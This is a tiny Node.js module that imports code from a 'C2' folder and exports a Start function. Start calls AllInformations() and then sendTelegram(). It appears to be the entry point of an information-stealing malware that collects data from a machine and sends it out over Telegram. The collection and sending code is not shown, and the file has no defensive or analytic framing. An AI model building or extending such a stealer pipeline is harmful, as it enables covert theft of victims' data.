const mainPro = require("./C2/index");

async function Start() {
   await mainPro.AllInformations(),
   await mainPro.sendTelegram()
}

module.exports = { Start };
